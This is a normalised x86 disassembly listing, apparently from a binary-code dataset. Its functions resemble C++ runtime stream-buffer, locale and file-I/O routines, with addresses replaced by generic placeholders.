call sub_407b69
retn 0x4
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp + 0x8 ] r--data
call sub_406719
push r--data
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x1c ] r--data
call sub_406c8a
sub_404dda
push 0x4
mov eax sub_413985
call sub_407aca
mov esi ecx
mov [ ebp - 0x10 ] esi
push esi
mov [ ebp - 0x4 ] 0x4
call sub_405e4e
mov eax [ esi + 0x1c ]
pop ecx
test eax eax
je r-xdata
and [ esi + 0x1c ] 0x0
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call sub_408a41
pop ecx
and [ esi + 0x14 ] 0x0
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_408a41
pop ecx
and [ esi + 0xc ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_408a41
pop ecx
and [ esi + 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_405ccd
call sub_407b69
retn
push eax
call sub_408a41
pop ecx
sub_404e52
push 0x28
mov eax sub_4139d0
call sub_407aca
mov edi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test edi edi
je r-xdata
push 0x2
pop eax
call sub_407b69
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x18
call sub_406c0a
pop ecx
mov [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x34 ]
call sub_404dda
push ecx
lea ecx [ ebp - 0x34 ]
call sub_404d60
mov ecx [ ebp + 0x8 ]
push 0x0
push eax
mov [ ebp - 0x10 ] 0x1
call sub_404817
jmp r-xdata
lea ecx [ eax + 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] eax
je r-xdata
sub_404ecc
push 0x4
mov eax sub_4139ab
call sub_407aca
mov esi ecx
mov [ ebp - 0x10 ] esi
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_4062ad
and [ ebp - 0x4 ] 0x0
push 0x4
call sub_406c0a
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_40474d
jmp r-xdata
mov ecx esi
mov [ esi + 0x38 ] eax
call sub_404d1e
mov eax esi
call sub_407b69
retn
sub_404f18
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
push esi
mov esi ecx
sete al
mov [ esi + 0x50 ] al
mov [ esi + 0x49 ] 0x0
call sub_404d1e
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov [ esi + 0x54 ] eax
mov eax [ rw-data ]
and [ esi + 0x44 ] 0x0
mov [ esi + 0x4c ] eax
pop esi
pop ebp
retn 0x8
lea ecx [ eax + 0x8 ]
mov [ esi + 0x10 ] ecx
mov [ esi + 0x14 ] ecx
lea ecx [ eax + 0x4 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
mov [ esi + 0x30 ] ecx
mov [ esi + 0x34 ] ecx
sub_404f66
push 0x14
mov eax sub_413a16
call sub_407aca
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_405ca5
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_4046a8
mov ecx [ ebp + 0x8 ]
push eax
call sub_404781
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_405ccd
mov eax edi
call sub_407b69
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_404e52
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_4046df
push edi
call sub_405cf9
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_406780
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_406c8a
sub_40500a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
call sub_408a86
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
sub_40502a
mov edi edi
push ebp
mov ebp esp
movsx eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
push eax
call sub_408b7a
pop ecx
pop ecx
xor ecx ecx
cmp eax 0xffffffff
setne al
pop ebp
retn
sub_405048
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
push [ ebp + 0xc ]
push eax
call sub_408d59
pop ecx
pop ecx
xor ecx ecx
cmp eax 0xffffffff
setne al
pop ebp
retn
sub_405086
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x54 ] 0x0
je r-xdata
xor eax eax
pop esi
retn
mov eax [ esi ]
push 0xffffffff
call [ eax + 0xc ]
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x54 ]
call sub_409101
pop ecx
test eax eax
jns r-xdata
or eax 0xffffffff
pop esi
retn
sub_4050b3
mov edi edi
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x1c ]
mov edi eax
or eax 0xffffffff
cmp edi eax
je r-xdata
mov edx [ esi + 0x30 ]
mov edx [ edx ]
mov eax ecx
add edx eax
cmp eax edx
jae r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x10 ]
mov eax edi
movzx eax [ ecx ]
pop esi
retn
sub_4050f1
mov edx [ ecx + 0x10 ]
push esi
mov esi [ edx ]
lea eax [ ecx + 0x48 ]
cmp esi eax
je r-xdata
mov [ edx ] eax
mov edx [ ecx + 0x20 ]
mov [ edx ] eax
mov edx ecx
sub edx eax
mov eax [ ecx + 0x30 ]
add edx 0x49
mov [ eax ] edx
pop esi
retn
mov [ ecx + 0x3c ] esi
mov esi [ ecx + 0x30 ]
mov esi [ esi ]
push edi
mov edi [ ecx + 0x20 ]
add esi [ edi ]
pop edi
mov [ ecx + 0x40 ] esi
sub_405125
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
mov eax [ ebp + 0x20 ]
mov ecx [ ebp + 0x18 ]
push 0x3
mov [ eax ] ecx
pop eax
pop ebp
retn 0x1c
sub_40516c
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_406807
pop ecx
sub_40518e
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x10 ]
cmp [ ecx ] eax
jae r-xdata
or eax 0xffffffff
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
mov eax [ esi + 0x30 ]
inc [ eax ]
mov esi [ esi + 0x20 ]
dec [ esi ]
lea eax [ ebx + 0x1 ]
neg eax
sbb eax eax
and eax ebx
jmp r-xdata
movzx eax [ eax - 0x1 ]
cmp eax ebx
jne r-xdata
mov ecx [ esi + 0x20 ]
lea eax [ esi + 0x48 ]
cmp [ ecx ] eax
je r-xdata
push eax
lea eax [ ebp + 0xb ]
push eax
mov [ ebp + 0xb ] bl
call sub_405048
pop ecx
pop ecx
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx esi
mov [ eax ] bl
call sub_4050f1
jmp r-xdata
mov eax ebx
jmp r-xdata
sub_405213
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
push edi
mov edi ecx
mov ecx esi
call [ eax + 0x4 ]
test al al
je r-xdata
mov ecx edi
mov [ edi + 0x44 ] esi
call sub_404d1e
and [ edi + 0x44 ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_405240
push 0x28
mov eax sub_4139d0
call sub_407aca
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x2
pop eax
call sub_407b69
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x8
call sub_406c0a
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_404dda
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_404d60
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
jmp r-xdata
sub_4052bf
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x54 ]
xor ecx ecx
cmp eax ecx
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] ecx
jne r-xdata
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push eax
call sub_40915d
add esp 0x10
test eax eax
jne r-xdata
mov edx [ ebp + 0xc ]
or edx [ ebp + 0x10 ]
jne r-xdata
push 0x1
push [ esi + 0x54 ]
mov ecx esi
call sub_404f18
mov eax esi
jmp r-xdata
push 0x4
pop ecx
pop esi
pop ebp
retn 0xc
sub_40530b
push 0x4
mov eax sub_4139f3
call sub_407aca
lea eax [ ebp - 0x10 ]
push eax
call sub_4047bd
and [ ebp - 0x4 ] 0x0
push eax
call sub_404f66
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
mov esi eax
call sub_404769
push [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x18 ]
call sub_407b69
retn 0x4
sub_40534b
push 0x14
mov eax sub_413a16
call sub_407aca
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_405ca5
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_4046a8
mov ecx [ ebp + 0x8 ]
push eax
call sub_404781
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_405ccd
mov eax edi
call sub_407b69
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_405240
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_4046df
push edi
call sub_405cf9
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_406780
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_406c8a
sub_4053e8
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40534b
pop ecx
push eax
mov ecx esi
call sub_405213
pop esi
pop ebp
retn 0x4
sub_405406
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40497e
mov eax [ ebp + 0x8 ]
and [ esi + 0x3c ] 0x0
push 0x20
mov ecx esi
mov [ esi + 0x38 ] eax
call sub_40530b
cmp [ esi + 0x38 ] 0x0
mov [ esi + 0x40 ] al
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0xc ]
or eax 0x4
push 0x0
push eax
mov ecx esi
call sub_4012c0
pop esi
pop ebp
retn 0x8
push esi
call sub_4060ab
pop ecx
sub_405451
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
push 0x0
push edi
call sub_4018e0
test al al
je r-xdata
push r--data
call sub_4045e8
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
mov ecx esi
push edi
push 0x0
call sub_401180
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_4054a0
push 0x8
mov eax sub_413a4d
call sub_407aca
mov esi ecx
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ebp - 0x10 ] eax
cmp [ ebp + 0x10 ] eax
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push [ ebp + 0xc ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push [ ebp + 0x8 ]
add ecx esi
call sub_405406
mov eax esi
call sub_407b69
retn 0xc
mov [ esi ] r--data
mov [ esi + 0x8 ] r--data
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] 0x1
sub_4054fa
push 0x2c
mov eax sub_413a9d
call sub_407b33
mov esi ecx
mov eax [ esi + 0x20 ]
mov eax [ eax ]
xor ebx ebx
cmp eax ebx
je r-xdata
cmp [ esi + 0x54 ] ebx
jne r-xdata
mov eax [ esi + 0x20 ]
mov ecx [ esi + 0x30 ]
mov eax [ eax ]
mov ecx [ ecx ]
add ecx eax
cmp eax ecx
jae r-xdata
mov ecx esi
call sub_404cfd
cmp [ esi + 0x44 ] ebx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov esi [ esi + 0x20 ]
mov eax [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
movzx eax [ eax ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x4 ] ebx
jmp r-xdata
push [ esi + 0x54 ]
lea eax [ ebp - 0x2d ]
push eax
mov [ ebp - 0x2d ] bl
call sub_40500a
pop ecx
pop ecx
test al al
je r-xdata
call sub_407b7d
retn
push [ esi + 0x54 ]
call sub_408a86
pop ecx
cmp eax 0xffffffff
jne r-xdata
movzx eax [ ebp - 0x2d ]
jmp r-xdata
push eax
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_401df0
cmp [ ebp - 0x18 ] 0x10
mov edx [ ebp - 0x2c ]
mov eax edx
jae r-xdata
or esi 0xffffffff
add eax [ ebp - 0x1c ]
mov ecx [ esi + 0x44 ]
mov edi [ ecx ]
lea ebx [ ebp - 0x38 ]
push ebx
lea ebx [ ebp - 0x2c ]
push ebx
lea ebx [ ebp - 0x2d ]
push ebx
lea ebx [ ebp - 0x34 ]
push ebx
push eax
push edx
lea eax [ esi + 0x4c ]
push eax
call [ edi + 0x10 ]
xor ebx ebx
cmp eax ebx
jl r-xdata
lea eax [ ebp - 0x2c ]
mov edx eax
xor ecx ecx
inc ecx
cmp eax ecx
jle r-xdata
lea eax [ ebp - 0x2d ]
cmp [ ebp - 0x38 ] eax
mov eax [ ebp - 0x2c ]
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
jae r-xdata
cmp [ ebp - 0x1c ] ecx
jb r-xdata
sub eax [ ebp - 0x34 ]
add eax [ ebp - 0x1c ]
mov edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x34 ]
sub ecx eax
push ecx
push ebx
lea ecx [ ebp - 0x2c ]
call sub_401570
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp edi ebx
jg r-xdata
push ecx
push eax
push ecx
lea eax [ ebp - 0x2d ]
push eax
call sub_409253
add esp 0x10
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp - 0x34 ]
push [ esi + 0x54 ]
dec edi
movsx eax [ edi + eax ]
push eax
call sub_408d59
pop ecx
pop ecx
movzx esi [ ebp - 0x2d ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_4014c0
mov eax esi
jmp r-xdata
sub_40566b
push 0x24
mov eax sub_413a70
call sub_407b33
mov esi ecx
xor ebx ebx
cmp [ esi + 0x44 ] ebx
je r-xdata
mov al 0x1
cmp [ esi + 0x49 ] bl
je r-xdata
mov eax [ esi ]
push 0xffffffff
call [ eax + 0xc ]
cmp eax 0xffffffff
jne r-xdata
push ebx
push 0x8
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_405451
mov [ ebp - 0x4 ] ebx
xor al al
jmp r-xdata
mov edx [ ebp - 0x2c ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov edx eax
call sub_407b7d
retn
mov ecx [ esi + 0x44 ]
mov edi [ ecx ]
lea ebx [ ebp - 0x30 ]
push ebx
mov ebx [ ebp - 0x1c ]
add eax ebx
push eax
push edx
lea eax [ esi + 0x4c ]
push eax
call [ edi + 0x18 ]
sub eax 0x0
je r-xdata
mov [ esi + 0x49 ] 0x0
dec eax
je r-xdata
mov edi [ ebp - 0x30 ]
sub edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
dec eax
dec eax
je r-xdata
cmp [ esi + 0x49 ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov bl 0x1
jmp r-xdata
xor bl bl
test edi edi
jne r-xdata
push [ esi + 0x54 ]
push edi
push 0x1
push eax
call sub_40941f
add esp 0x10
cmp edi eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_4014c0
mov al bl
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
push 0x8
lea ecx [ ebp - 0x2c ]
call sub_401df0
jmp r-xdata
sub_405763
push 0x2c
mov eax sub_413a9d
call sub_407b33
mov ebx [ ebp + 0x8 ]
mov esi ecx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
xor edi edi
cmp ecx edi
je r-xdata
xor eax eax
cmp [ esi + 0x54 ] edi
jne r-xdata
mov eax [ esi + 0x34 ]
mov edx [ eax ]
add edx ecx
cmp ecx edx
jae r-xdata
mov ecx esi
call sub_404cfd
cmp [ esi + 0x44 ] edi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
dec [ eax ]
mov esi [ esi + 0x24 ]
mov eax [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov [ eax ] bl
push edi
push 0x8
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] bl
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
call sub_405451
mov [ ebp - 0x4 ] edi
push [ esi + 0x54 ]
push ebx
call sub_40502a
pop ecx
pop ecx
test al al
je r-xdata
call sub_407b7d
retn 0x4
mov edx [ ebp - 0x2c ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov edx eax
jmp r-xdata
add eax [ ebp - 0x1c ]
mov ecx [ esi + 0x44 ]
mov edi [ ecx ]
lea ebx [ ebp - 0x34 ]
push ebx
push eax
push edx
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x2f ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea eax [ esi + 0x4c ]
push eax
call [ edi + 0x14 ]
test eax eax
js r-xdata
or esi 0xffffffff
cmp eax 0x1
jg r-xdata
mov eax ebx
jmp r-xdata
cmp eax 0x3
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push [ esi + 0x54 ]
push [ ebp - 0x30 ]
call sub_40502a
pop ecx
pop ecx
test al al
jne r-xdata
mov edi [ ebp - 0x34 ]
sub edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
mov esi [ ebp + 0x8 ]
jmp r-xdata
lea eax [ ebp - 0x30 ]
mov [ esi + 0x49 ] 0x1
cmp [ ebp - 0x38 ] eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_4014c0
mov eax esi
jmp r-xdata
test edi edi
jne r-xdata
push [ esi + 0x54 ]
push edi
push 0x1
push eax
call sub_40941f
add esp 0x10
cmp edi eax
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x1c ] 0x20
jae r-xdata
push edi
push 0x8
lea ecx [ ebp - 0x2c ]
call sub_401df0
jmp r-xdata
sub_4058be
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
push edi
lea ecx [ esi + 0x48 ]
xor edi edi
cmp [ eax ] ecx
jne r-xdata
cmp [ esi + 0x54 ] edi
je r-xdata
cmp [ ebp + 0x14 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov ecx [ r--data ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] edi
mov ecx esi
call sub_40566b
test al al
je r-xdata
cmp [ esi + 0x44 ] edi
jne r-xdata
mov eax [ ebp + 0xc ]
or eax [ ebp + 0x10 ]
jne r-xdata
add [ ebp + 0xc ] 0xffffffff
adc [ ebp + 0x10 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esi + 0x54 ]
call sub_409590
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] 0x1
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ esi + 0x54 ]
call sub_409499
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ecx esi
call sub_404cfd
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ esi + 0x4c ]
mov [ eax ] edi
mov [ eax + 0x4 ] edi
mov [ eax + 0x10 ] ecx
jmp r-xdata
pop edi
pop esi
leave
retn 0x14
sub_405976
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi ecx
cmp [ esi + 0x54 ] 0x0
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov ecx [ r--data ]
mov [ eax + 0x4 ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
call sub_40566b
test al al
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ esi + 0x54 ]
call sub_40960f
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax edi
or eax ebx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ esi + 0x54 ]
call sub_409499
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x1
push ebx
push edi
push [ esi + 0x54 ]
call sub_409590
add esp 0x10
test eax eax
jne r-xdata
mov eax [ ebp + 0x1c ]
mov ecx esi
mov [ esi + 0x4c ] eax
call sub_404cfd
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ esi + 0x4c ]
jmp r-xdata
pop edi
pop esi
mov [ eax + 0x10 ] ecx
pop ebx
leave
retn 0x20
sub_405a2e
mov edi edi
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov edi esi
cmp [ esi + 0x54 ] ebx
je r-xdata
xor edi edi
call sub_40566b
test al al
jne r-xdata
push [ esi + 0x54 ]
call sub_4096b7
pop ecx
test eax eax
je r-xdata
xor edi edi
mov ecx esi
mov [ esi + 0x50 ] bl
mov [ esi + 0x49 ] bl
call sub_404d1e
mov [ esi + 0x54 ] ebx
mov eax [ rw-data ]
mov [ esi + 0x4c ] eax
mov eax edi
pop edi
mov [ esi + 0x44 ] ebx
pop esi
pop ebx
retn
sub_405a79
push 0x4
mov eax sub_413aca
call sub_407aca
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x54 ] 0x0
je r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
call sub_404cfd
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_404a5b
call sub_407b69
retn
mov ecx esi
call sub_405a2e
sub_405abd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_405a79
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_406807
pop ecx
sub_405ade
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_409ef3
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_409ecd
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
add eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_4099ff
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x1
je r-xdata
push ebx
call sub_409a79
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
push [ ebp - 0xc ]
push 0x0
call sub_4099b9
add esp 0x24
test eax eax
jne r-xdata
pop edi
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_405beb
mov edi edi
push ebp
mov ebp esp
push esi
call sub_409ef3
mov eax [ eax + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_409ecd
push 0x2
push 0x100
mov [ esi + 0x4 ] eax
call sub_409f5e
pop ecx
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
call sub_4099ff
and [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] eax
push 0x200
call sub_4099ff
push eax
push [ esi + 0x8 ]
call sub_406330
add esp 0xc
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_405c4b
mov edi edi
push edi
push rw-data
mov edi ecx
call [ InterlockedIncrement@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
retn
push esi
mov esi rw-data
push esi
call sub_4062f0
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_405c7c
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jns r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_406300
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_405ca5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] eax
cmp eax 0x4
jge r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
imul eax eax 0x18
add eax rw-data
push eax
call sub_406310
pop ecx
sub_405cf9
mov edi edi
push ebp
mov ebp esp
push 0x8
call sub_406c0a
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ rw-data ] eax
pop ebp
retn
sub_405d23
